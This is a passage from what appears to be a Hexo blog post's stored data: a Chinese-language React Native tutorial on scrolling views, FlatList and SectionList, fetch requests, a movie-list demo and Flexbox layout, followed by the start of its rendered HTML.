style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>Scrolling down</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>What's the best</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:48}}>Framework around?</Text>\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Image source={require('./1.png')} style={{width: 100, height: 100, borderColor: 'gray',  borderWidth: 1}} />\n        <Text style={{fontSize:80}}>React Native</Text>\n      </ScrollView>\n  );\n}\n}\n```\n\n`ScrollView`适合用来显示数量不多的滚动元素。放置在`ScrollView`中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。\n\n## 长列表\n\n`FlatList`组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。\n\n`FlatList`更适于==长列表数据，且元素个数可以增删。==和[`ScrollView`](https://reactnative.cn/docs/using-a-scrollview)不同的是，`FlatList`并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。==\n\n`FlatList`组件必须的两个属性是`data`和`renderItem`。`data`是列表的数据源，而`renderItem`则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。\n\n<img src=\"/FlatList.gif\" alt=\"FlatList\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    const styles = StyleSheet.create({\n      container: {\n       flex: 1,\n       paddingTop: 22\n      },\n      item: {\n        padding: 10,\n        fontSize: 18,\n        height: 44,\n        borderBottomColor: '#f0f',\n        borderBottomWidth: 1\n      },\n    })\n    const arr = [ {key: 'Devin'}, {key: 'Julie'}, {key: 'Dan'}, {key: 'Dominic'}, {key: 'Jackson'}, {key: 'James'}, {key: 'Joel'}, {key: 'John'}, {key: 'Jillian'}, {key: 'Jimmy'}, {key: 'Dan'}, {key: 'Dominic'}, {key: 'Jackson'}, {key: 'James'}, {key: 'Joel'}, {key: 'John'}, {key: 'Jillian'}, {key: 'Jimmy'},\n    ]\n    return (\n      <View style={styles.container}>\n        <FlatList\n          data={ arr }\n          renderItem={({item}) => <Text style={styles.item}>{item.key}</Text>}\n        />\n      </View>\n    );\n  }\n}\n```\n\n如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么`SectionList`将是个不错的选择\n\n<img src=\"/SectionList.gif\" alt=\"SectionList\" style=\"zoom:50%;\" />\n\n```jsx\nclass App extends Component {\n  render() {\n    const arr = [\n      {title: 'A', data: ['Aevin', 'Aan', 'Aominic']},\n      {title: 'B', data: ['Bevin', 'Ban', 'Bominic']},\n      {title: 'D', data: ['Devin', 'Dan', 'Dominic']},\n      {title: 'J', data: ['Jackson', 'James', 'Jillian', 'Jimmy', 'Joel', 'John', 'Julie']},\n    ]\n    return (\n      <View style={styles.container}>\n        <SectionList\n          sections={arr}\n          renderItem={({item}) => <Text style={styles.item}>{item}</Text>}\n          renderSectionHeader={({section}) => <Text style={styles.sectionHeader}>{section.title}</Text>}\n          keyExtractor={(item, index) => index}\n        />\n      </View>\n    );\n  }\n}\nconst styles = StyleSheet.create({\n  container: {\n   flex: 1,\n   paddingTop: 22\n  },\n  sectionHeader: {\n    paddingTop: 2,\n    paddingLeft: 10,\n    paddingRight: 10,\n    paddingBottom: 2,\n    fontSize: 14,\n    fontWeight: 'bold',\n    backgroundColor: 'rgba(247,247,247,1.0)',\n    borderTopWidth: 1,\n    borderTopColor: '#db5420'\n  },\n  item: {\n    padding: 10,\n    fontSize: 18,\n    height: 44,\n  },\n})\n\n```\n\n## 网络（进行中）\n\n### 使用 Fetch\n\n#### 发起请求\n\n```js\nfetch('https://mywebsite.com/endpoint/', {\n  method: 'POST',\n  headers: {\n    Accept: 'application/json',\n    'Content-Type': 'application/json',\n  },\n  body: JSON.stringify({\n    firstParam: 'yourValue',\n    secondParam: 'yourOtherValue',\n  }),\n});\n```\n\n#### 处理服务器的响应数据\n\nFetch 方法会返回一个[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)，这种模式可以简化异步风格的代码\n\n```js\nfunction getMoviesFromApiAsync() {\n  return fetch('https://facebook.github.io/react-native/movies.json')\n    .then((response) => response.json())\n    .then((responseJson) => {\n      return responseJson.movies;\n    })\n    .catch((error) => {\n      console.error(error);\n    });\n}\n\n// async/await 语法：\n// 注意这个方法前面有async关键字\nasync function getMoviesFromApi() {\n  try {\n    // 注意这里的await语句，其所在的函数必须有async关键字声明\n    let response = await fetch(\n      'https://facebook.github.io/react-native/movies.json',\n    );\n    let responseJson = await response.json();\n    return responseJson.movies;\n  } catch (error) {\n    console.error(error);\n  }\n}\n```\n\n测试(catch 住`fetch`可能抛出的异常)\n\n```jsx\nclass App extends Component {\n  constructor(props){\n    super(props);\n    this.state ={ isLoading: true}\n  }\n  componentDidMount(){\n    //  *****************\n    return fetch('https://facebook.github.io/react-native/movies.json')\n      .then((response) => response.json())\n      .then((responseJson) => {\n        this.setState({\n          isLoading: false,\n          dataSource: responseJson.movies,\n        }, function(){\n        });\n      })\n      .catch((error) =>{\n        console.error(error);\n      });\n  }\n  render(){\n    if(this.state.isLoading){\n      return(\n        <View style={{flex: 1, padding: 20}}>\n          <ActivityIndicator/>\n        </View>\n      )\n    }\n    return(\n      <View style={{flex: 1, paddingTop:20}}>\n        <FlatList\n          data={this.state.dataSource}\n          renderItem={({item}) => <Text>{item.title}, {item.releaseYear}</Text>}\n          keyExtractor={(item, index) => item.id}\n        />\n      </View>\n    );\n  }\n}\n```\n\n> 从 Android9 开始，也会默认阻止 http 请求，请参考[相关配置](https://blog.csdn.net/qq_40347548/article/details/86766932)\n\n> 默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考[这篇帖子](https://segmentfault.com/a/1190000002933776)。\n\n### 使用其他的网络库\n\nReact Native 中已经内置了[XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如[frisbee](https://github.com/niftylettuce/frisbee)或是[axios](https://github.com/mzabriskie/axios)等。但注意不能使用 jQuery。\n\n> 在应用中你可以访问任何网站，没有[跨域](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing)的限制。\n\n## 电影列表\n\n> 在一个`FlatList`中展示出电影列表。\n\n### 准备工作\n\n使用`cli`工具创建一个工程：\n\n```bash\nreact-native init SampleAppMovies\n```\n\n这条命令除了会下载`js`文件，还会下载在`SampleAppMovies/iOS/SampleAppMovies.xcodeproj`和`SampleAppMovies/android/app`下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。\n\n### 开发\n\n`Android`版本：先连接设备或启动模拟器，然后在`SampleAppMovies`目录下运行`react-native run-android`，就会构建工程。\n\n#### 电影列表\n\n<img src=\"/movielist.gif\" alt=\"movielist\" style=\"zoom:50%;\" />\n\n```js\nimport React, { useState, Component } from 'react';\nimport { View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback } from 'react-native';\n\n// 原 url\nconst REQUEST_URL =  \"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json\";\n\nclass App extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      data: [],\n      loaded: false\n    };\n    this.fetchData = this.fetchData.bind(this);\n  }\n  // 请求数据\n  fetchData() {\n    let data = require('./test/moivelist.json')\n    // 通过定时器 模拟ajax\n    setTimeout(() => {\n      this.setState({\n        data: data.movies,\n        loaded: true\n      });\n    }, 3000)\n    // 真正请求的ajax\n    // fetch(REQUEST_URL)\n    //   .then((response) => response.json())\n    //   .then((responseData) => {\n    //     // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作\n    //     this.setState({\n    //       movies: responseData.movies,\n    //     });\n    //   });\n  }\n  // 在生命周期中调用接口\n  componentDidMount() {\n    this.fetchData();\n  }\n  render(){\n    if (!this.state.loaded) {\n      return this.renderLoadingView();\n    }\n    return (\n      <FlatList\n      data={this.state.data}\n      renderItem={this.renderMovie}\n      style={styles.list}\n      keyExtractor={item => item.id}\n    />\n    );\n  }\n  // 加载动画\n  renderLoadingView() {\n    return (\n      <View style={styles.container}>\n        <Text>\n          正在加载电影数据……\n        </Text>\n      </View>\n    );\n  }\n  // 渲染列表\n  renderMovie({ item }) {\n    // { item }是一种“解构”写法，请阅读ES2015语法的相关文档\n    // item也是FlatList中固定的参数名，请阅读FlatList的相关文档\n    return (\n      <View style={styles.container}>\n        <Image\n          source={{uri: item.posters.thumbnail}}\n          style={styles.thumbnail}\n        />\n        <View style={styles.rightContainer}>\n          <Text style={styles.title}>{item.title}</Text>\n          <Text style={styles.year}>{item.year}</Text>\n        </View>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  list: {\n    paddingTop: 20,\n    backgroundColor: '#F5FCFF',\n  },\n  container: {\n    flex: 1,\n    flexDirection: 'row',\n    justifyContent: 'center',\n    alignItems: 'center',\n    backgroundColor: '#F5FCFF',\n  },\n  rightContainer: {\n    flex: 1,\n  },\n  title: {\n    fontSize: 20,\n    marginBottom: 8,\n    textAlign: 'center',\n  },\n  year: {\n    textAlign: 'center',\n  },\n  thumbnail: {\n    width: 53,\n    height: 81\n  }\n});\n\nexport default App;\n```\n\n# 设计\n\n## RN中的样式\n\n所有的核心组件都接受名为`style`的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将`background-color`改为`backgroundColor`。\n\n+ `style`属性可以是一个普通的 JavaScript 对象\n\n+ 使用`StyleSheet.create`来集中定义组件的样式。\n\n```jsx\nimport React, { Component } from 'react';\nimport { StyleSheet, Text, View } from 'react-native';\n\nexport default class LotsOfStyles extends Component {\n  render() {\n    return (\n      <View>\n        <Text style={styles.red}>just red</Text>\n        <Text style={styles.bigBlue}>just bigBlue</Text>\n        <Text style={[styles.bigBlue, styles.red]}>bigBlue, then red</Text>\n        <Text style={[styles.red, styles.bigBlue]}>red, then bigBlue</Text>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  bigBlue: {\n    color: 'blue',\n    fontWeight: 'bold',\n    fontSize: 30,\n  },\n  red: {\n    color: 'red',\n  },\n});\n```\n\n## 高度与宽度\n\n组件的高度和宽度决定了其在屏幕上显示的尺寸。\n\n### 指定宽高\n\n样式中指定固定的`width`和`height`。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。\n\n```jsx\nimport React, { Component } from 'react';\nimport { View } from 'react-native';\n\nexport default class FixedDimensionsBasics extends Component {\n  render() {\n    return (\n      <View>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'skyblue'}} />\n        <View style={{width: 150, height: 150, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。\n\n<img src=\"/image-20200326151335084.png\" alt=\"image-20200326151335084\" style=\"zoom:50%;\" />\n\n**注意：此时没法适配多种屏幕大小**\n\n### 弹性（Flex）宽高\n\n在组件样式中使用`flex`可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用`flex:1`来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了`flex:1`，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的`flex`值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间`flex`值的比）。\n\n```jsx\nconst App = () => {\n  return (\n    <View style={styles.father}>\n      <View style={styles.son1} />\n      <View style={styles.son2} />\n      <View style={styles.son3} />\n    </View>\n  )\n}\n// 去掉父View中的`flex: 1`。  ----- View不再具有尺寸，因此子组件也无法再撑开。\n// 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300\nconst styles = StyleSheet.create({\n  father: {\n    flex: 1,\n    // flexDirection: \"row\", // 改变子元素的伸缩方向\n  },\n  son1: {\n    flex: 1,\n    backgroundColor: 'powderblue'\n  },\n  son2: {\n    flex: 2, \n    backgroundColor: 'skyblue'\n  },\n  son3: {\n    flex: 3,\n    backgroundColor: 'steelblue'\n  },\n});\n```\n\n<img src=\"/image-20200326151248022.png\" alt=\"image-20200326151248022\" style=\"zoom:50%;\" />\n\n## 使用Flexbox布局\n\nFlexbox 可以在不同屏幕尺寸上提供一致的布局结构。\n\n使用`flexDirection`、`alignItems`和 `justifyContent`三个样式属性就已经能满足大多数布局需求。\n\n> React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：`flexDirection`的默认值是`column`而不是`row`，而`flex`也只能指定一个数字值。\n\n### Flex\n\n如上\n\n### Flex Direction\n\n`flexDirection`可以决定布局的**主轴**。**水平轴(`row`)**方向，竖直轴(`column`)**方向。默认值是**竖直轴(`column`)方向。\n\n```jsx\n\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`flexDirection`改为`column`看看\n      <View style={{flex: 1, flexDirection: 'row'}}>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{width: 50, height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{width: 50, height: 50, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n\n```\n\n<img src=\"/image-20200326154915534.png\" alt=\"image-20200326154915534\" style=\"zoom:50%;\" />\n\n### 布局方向\n\n**LTR：文本和子项，从左到右排列**\n\n布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。\n\n 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。\n\nLTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。\n\nRTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。\n\n### Justify Content\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`justifyContent`改为`center`看看\n      // 尝试把`flexDirection`改为`row`看看\n      <View style={{\n        flex: 1,\n        flexDirection: 'column', // 默认纵向布局\n        justifyContent: 'space-between',\n      }}>\n        <View style={{width: 100, height: 100, backgroundColor: 'powderblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'skyblue'}} />\n        <View style={{width: 100, height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200326155234896.png\" alt=\"image-20200326155234896\" style=\"zoom:50%;\" />\n\n### Align Items\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      // 尝试把`alignItems`改为`flex-start`看看\n      // 尝试把`justifyContent`改为`flex-end`看看\n      // 尝试把`flexDirection`改为`row`看看\n      <View style={{\n        flex: 1,\n        flexDirection: 'column',\n        justifyContent: 'center',\n        alignItems: 'stretch',\n      }}>\n        <View style={{width: 50, height: 50, backgroundColor: 'powderblue'}} />\n        <View style={{height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n```\n\n<img src=\"/image-20200326155524158.png\" alt=\"image-20200326155524158\" style=\"zoom:50%;\" />\n\n### Align Self\n\nalignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。\n\n```jsx\nclass App extends Component {\n  render() {\n    return (\n      <View style={{\n        flex: 1,\n        flexDirection: 'column',\n        justifyContent: 'center',\n        alignItems: 'stretch',\n      }}>\n        <View style={{height: 100, backgroundColor: 'powderblue'}} >\n          <Text style={{alignSelf: 'flex-end',weight: 50, height: 50, backgroundColor: 'red'}} >子内容</Text>\n        </View>\n        <View style={{height: 50, backgroundColor: 'skyblue'}} />\n        <View style={{height: 100, backgroundColor: 'steelblue'}} />\n      </View>\n    );\n  }\n}\n\n```\n\n**alignSelf: `flex-start|flex-end|center|stretch`**\n\n<img src=\"/image-20200326160914205.png\" alt=\"image-20200326160914205\" style=\"zoom:50%;\" />\n\n### Align Content\n\nalignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。\n\n+ `flex-start`（默认值）将换行对齐到容器横轴的起点。\n+ `flex-end`将换行对齐到容器横轴的末端。\n+ `stretch` 包装线以匹配容器横轴的高度。\n+ `center`将包装线对齐到容器横轴的中心。\n+ `space-between`在容器的主轴上均匀间隔的线，在线之间分配剩余空间。\n+ `space-around`在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。\n+ `space-evenly` 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。\n\n<img src=\"/image-20200331154557560.png\" alt=\"image-20200331154557560\" style=\"zoom:67%;\" />\n\n### Flex Wrap\n\nflexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。\n\n换行时，可以使用alignContent指定行在容器中的放置方式。\n\n<img src=\"/image-20200331154722643.png\" alt=\"image-20200331154722643\" style=\"zoom:50%;\" />\n\n### Flex Basis, Grow, and Shrink\n\n+ flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。\n  + flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。\n\n+ flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。\n  + Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。\n\n+ flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。\n\n### 宽度和高度\n\nYoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。\n\n宽度和高度都可以采用以下值：\n\n+ auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。\n\n+ pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。\n\n+ percent定义宽度或高度，以其父级宽度或高度的百分比表示。\n\n### 绝对和相对布局\n\n元素的位置类型定义了元素在其父元素中的位置。\n\n相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。\n\n绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。\n\n<img src=\"/image-20200331155044160.png\" alt=\"image-20200331155044160\" style=\"zoom:50%;\" />\n","slug":"RN基础入门","published":1,"updated":"2020-06-18T07:09:21.404Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u250000qrwtdxh4szlf","content":"<h1 id=\"入门基础\"><a href=\"#入门基础\" class=\"headerlink\" title=\"入门基础\"></a>入门基础</h1><h2 id=\"核心组件和原生组件\"><a href=\"#核心组件和原生组件\" class=\"headerlink\" title=\"核心组件和原生组件\"></a>核心组件和原生组件</h2><h3 id=\"原生组件\"><a href=\"#原生组件\" class=\"headerlink\" title=\"原生组件\"></a>原生组件</h3><p>使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。</p>\n<p>通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。</p>\n<p>React Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。</p>\n<h3 id=\"核心组件\"><a href=\"#核心组件\" class=\"headerlink\" title=\"核心组件\"></a>核心组件</h3><p>React Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">RN UI 组件</th>\n<th style=\"text-align:left\">ANDROID VIEW</th>\n<th style=\"text-align:left\">IOS VIEW</th>\n<th style=\"text-align:left\">WEB ANALOG</th>\n<th style=\"text-align:left\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\"><code>&lt;View&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ViewGroup&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIView&gt;</code></td>\n<td style=\"text-align:left\">A non-scrollling <code>&lt;div&gt;</code></td>\n<td style=\"text-align:left\">支持flexbox布局、样式、一些触摸处理和可访问性控制的容器</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;Text&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;TextView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UITextView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;p&gt;</code></td>\n<td style=\"text-align:left\">显示，设置样式和嵌套文本字符串，甚至处理触摸事件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;Image&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ImageView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIImageView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;img&gt;</code></td>\n<td style=\"text-align:left\">显示不同类型的图像</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;ScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;ScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UIScrollView&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;div&gt;</code></td>\n<td style=\"text-align:left\">通用滚动容器，可以包含多个组件和视图</td>\n</tr>\n<tr>\n<td style=\"text-align:left\"><code>&lt;TextInput&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;EditText&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;UITextField&gt;</code></td>\n<td style=\"text-align:left\"><code>&lt;input type=&quot;text&quot;&gt;</code></td>\n<td style=\"text-align:left\">允许用户输入文字</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View, Text, Image, ScrollView, TextInput, FlatList &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;ScrollView&gt;</span><br><span class=\"line\">      &lt;Text&gt;Some text&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text&gt;Some moqqqre text&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;&#123;<span class=\"attr\">uri</span>: <span class=\"string\">'bd'</span>&#125;&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>&#125;&#125;&gt;&lt;/Image&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'./1.png'</span>)&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>, <span class=\"attr\">borderColor</span>: <span class=\"string\">'gray'</span>,  <span class=\"attr\">borderWidth</span>: <span class=\"number\">1</span>&#125;&#125;/&gt;</span><br><span class=\"line\">        &lt;Image source=&#123;&#123;<span class=\"attr\">uri</span>: <span class=\"string\">\"https://facebook.github.io/react-native/docs/assets/p_cat2.png\"</span>&#125;&#125; style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">200</span>, <span class=\"attr\">height</span>: <span class=\"number\">200</span>&#125;&#125;/&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;TextInput</span></span><br><span class=\"line\"><span class=\"regexp\">        style=&#123;&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">          height: 40,</span></span><br><span class=\"line\"><span class=\"regexp\">          borderColor: 'gray',</span></span><br><span class=\"line\"><span class=\"regexp\">          borderWidth: 1</span></span><br><span class=\"line\"><span class=\"regexp\">        &#125;&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        defaultValue=\"You can type in me\"</span></span><br><span class=\"line\"><span class=\"regexp\">      /</span>&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/ScrollView&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  )</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">export default App;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"React基础\"><a href=\"#React基础\" class=\"headerlink\" title=\"React基础\"></a>React基础</h2><h3 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h3><h4 id=\"Function-Component\"><a href=\"#Function-Component\" class=\"headerlink\" title=\"Function Component\"></a>Function Component</h4> <figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Text &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Cat</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"Class-Component\"><a href=\"#Class-Component\" class=\"headerlink\" title=\"Class Component\"></a>Class Component</h4><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span 